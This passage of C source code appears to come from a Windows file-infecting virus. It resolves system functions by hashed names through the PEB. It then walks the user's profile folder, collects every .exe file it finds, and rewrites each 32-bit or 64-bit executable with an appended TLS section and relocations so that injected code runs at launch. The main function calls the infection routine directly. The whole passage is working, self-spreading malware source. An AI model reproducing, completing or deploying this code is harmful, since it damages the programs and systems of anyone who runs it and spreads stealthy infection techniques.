   CVector new_section_data = create_32bit_tls_section(iat, module, new_section);

   /* if there's a relocation directory, add new relocations targetting our new tls directory */
   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
      create_tls_relocations(iat, module, new_section, &new_section_data, FALSE);

   result = cvector_alloc(iat, sizeof(uint8_t), module->elements + new_section_data.elements);
   iat->memcpy(result.data, module->data, module->elements);
   iat->memcpy(CVECTOR_CAST(&result, uint8_t *)+module->elements, new_section_data.data, new_section_data.elements);

   cvector_free(iat, &new_section_data);
            
   return result;
}

CVector infect_64bit(InfectorIAT *iat, CVector *module)
{
   uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
   PIMAGE_NT_HEADERS64 nt_headers = RECAST(PIMAGE_NT_HEADERS64,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
   IMAGE_SECTION_HEADER *last_section = &section_table[nt_headers->FileHeader.NumberOfSections-1];
   IMAGE_SECTION_HEADER *new_section = &section_table[nt_headers->FileHeader.NumberOfSections];
   CVector result = cvector_alloc(iat, sizeof(uint8_t), 0);
   DWORD new_section_offset = last_section->PointerToRawData + last_section->SizeOfRawData;

   /* align the new section offset to the file alignment boundary */
   if (new_section_offset % nt_headers->OptionalHeader.FileAlignment != 0)
      new_section_offset += nt_headers->OptionalHeader.FileAlignment - (new_section_offset % nt_headers->OptionalHeader.FileAlignment);

   if (new_section_offset < module->elements) /* there's appended data to this binary, do not tamper */
      return result;

   /* increment the number of sections in the binary */
   nt_headers->FileHeader.NumberOfSections += 1;

   /* set the target address on the new section */
   new_section->PointerToRawData = new_section_offset;
   new_section->VirtualAddress = last_section->VirtualAddress + last_section->SizeOfRawData;

   /* align the new address on the virtual alignment boundary */
   if (new_section->VirtualAddress % nt_headers->OptionalHeader.SectionAlignment != 0)
      new_section->VirtualAddress += nt_headers->OptionalHeader.SectionAlignment - (new_section->VirtualAddress % nt_headers->OptionalHeader.SectionAlignment);

   CVector new_section_data = create_64bit_tls_section(iat, module, new_section);

   /* if there's a relocation directory, add new relocations targetting our new tls directory */
   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
      create_tls_relocations(iat, module, new_section, &new_section_data, TRUE);

   result = cvector_alloc(iat, sizeof(uint8_t), module->elements + new_section_data.elements);
   iat->memcpy(result.data, module->data, module->elements);
   iat->memcpy(CVECTOR_CAST(&result, uint8_t *)+module->elements, new_section_data.data, new_section_data.elements);

   cvector_free(iat, &new_section_data);
            
   return result;
}

void load_infector_iat(InfectorIAT *iat)
{
   if (iat == NULL)
      return;

#if defined(_M_IX86)
   PPEB peb = RECAST(PPEB,__readfsdword(0x30));
#elif defined(_M_AMD64)
   PPEB peb = RECAST(PPEB,__readgsqword(0x60));
#endif

   PFULL_PEB_LDR_DATA ldr = RECAST(PFULL_PEB_LDR_DATA,peb->Ldr);
   PFULL_LDR_DATA_TABLE_ENTRY list_entry = RECAST(PFULL_LDR_DATA_TABLE_ENTRY,ldr->InLoadOrderModuleList.Flink);
   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = RECAST(PFULL_LDR_DATA_TABLE_ENTRY,RECAST(PFULL_LDR_DATA_TABLE_ENTRY,list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink);
   iat->loadLibrary = RECAST(LoadLibraryAHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x53b2070f));
   iat->findFirstFile = RECAST(FindFirstFileAHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0xd7482f55));
   iat->findNextFile = RECAST(FindNextFileAHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x6f4d1398));
   iat->createFile = RECAST(CreateFileAHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0xbdcac9ce));
   iat->getFileSize = RECAST(GetFileSizeHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x44ed8118));
   iat->readFile = RECAST(ReadFileHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x54fcc943));
   iat->writeFile = RECAST(WriteFileHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x7f07c44a));
   iat->closeHandle = RECAST(CloseHandleHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0xfaba0065));
   PIMAGE_DOS_HEADER msvcrtModule = RECAST(PIMAGE_DOS_HEADER,iat->loadLibrary("msvcrt.dll"));
   iat->malloc = RECAST(mallocHeader,get_proc_by_hash(msvcrtModule, 0x558c274d));
   iat->realloc = RECAST(reallocHeader,get_proc_by_hash(msvcrtModule, 0xbf26b345));
   iat->free = RECAST(freeHeader,get_proc_by_hash(msvcrtModule, 0x99b3eedb));
   iat->strncat = RECAST(strncatHeader,get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
   iat->strnicmp = RECAST(strnicmpHeader,get_proc_by_hash(msvcrtModule, 0x3b2c5b30));
   iat->strlen = RECAST(strlenHeader,get_proc_by_hash(msvcrtModule, 0x58ba3d97));
   iat->memcpy = RECAST(memcpyHeader,get_proc_by_hash(msvcrtModule, 0xa45cec64));
   iat->memset = RECAST(memsetHeader,get_proc_by_hash(msvcrtModule, 0xcb80cc06));
   PIMAGE_DOS_HEADER shell32Module = RECAST(PIMAGE_DOS_HEADER,iat->loadLibrary("shell32.dll"));
   iat->getFolderPath = RECAST(SHGetFolderPathAHeader,get_proc_by_hash(shell32Module, 0xe8692330));
}

int infect(void)
{
   /* load our imports via custom GetProcAddress functions */
   InfectorIAT iat;
   load_infector_iat(&iat);

#ifdef BROODSAC_DEBUG
   char profile_directory[MAX_PATH+1] = BROODSAC_INFECTABLES;
#else
   char profile_directory[MAX_PATH+1];

   if (iat.getFolderPath(NULL, CSIDL_PROFILE, NULL, 0, profile_directory) != 0)
      return 1;
#endif

   /* dinosaur that Windows is, pathnames are short as hell.
    * prepending this magic string allows us to access path names that are HUGE!
    */
   char prepend_path[] = "\\\\?\\";
   size_t root_size = iat.strlen(prepend_path)+iat.strlen(profile_directory)+1;
   char *search_root = RECAST(char *,iat.malloc(root_size));
   iat.memcpy(search_root, prepend_path, iat.strlen(prepend_path)+1);
   iat.strncat(search_root, profile_directory, iat.strlen(profile_directory));

   /* create a stack of directory names to traverse */
   CVector search_stack = cvector_alloc(&iat, sizeof(char *), 1);
   CVECTOR_CAST(&search_stack, char **)[0] = search_root;

   /* create a vector of found executables */
   CVector found_executables = cvector_alloc(&iat, sizeof(char *), 0);

   /* iteratively search through directories in the target path via the
    * FindFirstFile API */
   while (search_stack.elements > 0)
   {
      char *search_visit;
      cvector_dequeue(&iat, &search_stack, &search_visit);
      
      char starSearch[] = "\\*";
      char exeSearch[] = ".exe";
      char *search_string = RECAST(char *,iat.malloc(iat.strlen(search_visit)+iat.strlen(starSearch)+1));
      iat.memcpy(search_string, search_visit, iat.strlen(search_visit)+1);
      iat.strncat(search_string, starSearch, iat.strlen(starSearch));
      
      WIN32_FIND_DATAA find_data;
      HANDLE find_handle = iat.findFirstFile(search_string, &find_data);

      if (find_handle == INVALID_HANDLE_VALUE)
         goto free_and_continue;

      do
      {
         char slash[] = "\\";
         char dot[] = ".";
         char dotDot[] = "..";

         if (iat.strnicmp(find_data.cFileName, dot, 2) == 0 || iat.strnicmp(find_data.cFileName, dotDot, 3) == 0)
            continue;
         else if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
                  (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400) // if directory and not symlink
         {
            char *new_directory = RECAST(char *,iat.malloc(iat.strlen(search_visit)+iat.strlen(slash)+iat.strlen(find_data.cFileName)+1));
            iat.memcpy(new_directory, search_visit, iat.strlen(search_visit)+1);
            iat.strncat(new_directory, slash, iat.strlen(slash));
            iat.strncat(new_directory, find_data.cFileName, iat.strlen(find_data.cFileName));

            cvector_push(&iat, &search_stack, &new_directory);
         }
         /* check if the filename is an exe */
         else if (iat.strnicmp(find_data.cFileName+(iat.strlen(find_data.cFileName)-4), exeSearch, iat.strlen(exeSearch)) == 0)
         {
            char *found_executable = RECAST(char *,iat.malloc(iat.strlen(search_visit)+iat.strlen(slash)+iat.strlen(find_data.cFileName)+1));
            iat.memcpy(found_executable, search_visit, iat.strlen(search_visit)+1);
            iat.strncat(found_executable, slash, iat.strlen(slash));
            iat.strncat(found_executable, find_data.cFileName, iat.strlen(find_data.cFileName));

            cvector_push(&iat, &found_executables, &found_executable);
         }
      } while (iat.findNextFile(find_handle, &find_data));

   free_and_continue:
      iat.free(search_string);
      iat.free(search_visit);
   }

   /* iterate over the found executables and determine if they are viable for infection */
   for (size_t i=0; i<found_executables.elements; ++i)
   {
      char *executable = CVECTOR_CAST(&found_executables, char **)[i];
      HANDLE exe_handle = iat.createFile(executable,
                                         GENERIC_READ,
                                         0,
                                         NULL,
                                         OPEN_EXISTING,
                                         FILE_ATTRIBUTE_NORMAL,
                                         NULL);

      if (exe_handle == INVALID_HANDLE_VALUE)
         goto end_exe_loop;
      
      DWORD file_size = iat.getFileSize(exe_handle, NULL);

      if (file_size == INVALID_FILE_SIZE)
         goto close_file;
      
      CVector exe_buffer = cvector_alloc(&iat, sizeof(uint8_t), file_size);
      DWORD bytes_read = 0;

      if (!iat.readFile(exe_handle, CVECTOR_CAST(&exe_buffer, uint8_t *), exe_buffer.elements, &bytes_read, NULL))
         goto free_file;

      iat.closeHandle(exe_handle);
      exe_handle = INVALID_HANDLE_VALUE;
      IMAGE_DOS_HEADER *dos_header = CVECTOR_CAST(&exe_buffer,PIMAGE_DOS_HEADER);

      if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
         goto free_file;
            
      IMAGE_NT_HEADERS *nt_headers = RECAST(PIMAGE_NT_HEADERS,CVECTOR_CAST(&exe_buffer,uint8_t *)+dos_header->e_lfanew);

      if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
         goto free_file;
            
      CVector rewritten_image = cvector_alloc(&iat, sizeof(uint8_t), 0);

      if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
         rewritten_image = infect_32bit(&iat, &exe_buffer);
      else if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
         rewritten_image = infect_64bit(&iat, &exe_buffer);
      
      if (rewritten_image.data != NULL)
      {
         HANDLE infected_handle = iat.createFile(executable,
                                                 GENERIC_WRITE,
                                                 0,
                                                 NULL,
                                                 CREATE_ALWAYS,
                                                 FILE_ATTRIBUTE_NORMAL,
                                                 NULL);

         if (infected_handle == INVALID_HANDLE_VALUE)
            goto infected_file_cleanup;

         DWORD bytes_written = 0;

         if (!iat.writeFile(infected_handle, rewritten_image.data, rewritten_image.elements, &bytes_written, NULL))
            goto infected_file_close;
         
      infected_file_close:
         iat.closeHandle(infected_handle);

      infected_file_cleanup:
         cvector_free(&iat, &rewritten_image);
      }

   free_file:
      cvector_free(&iat, &exe_buffer);

   close_file:
      if (exe_handle != INVALID_HANDLE_VALUE)
         iat.closeHandle(exe_handle);
      
   end_exe_loop:
      iat.free(executable);
   }

   cvector_free(&iat, &found_executables);
   return 0;
}

int main(int argc, char *argv[])
{
   //infect();
   return infect();
}
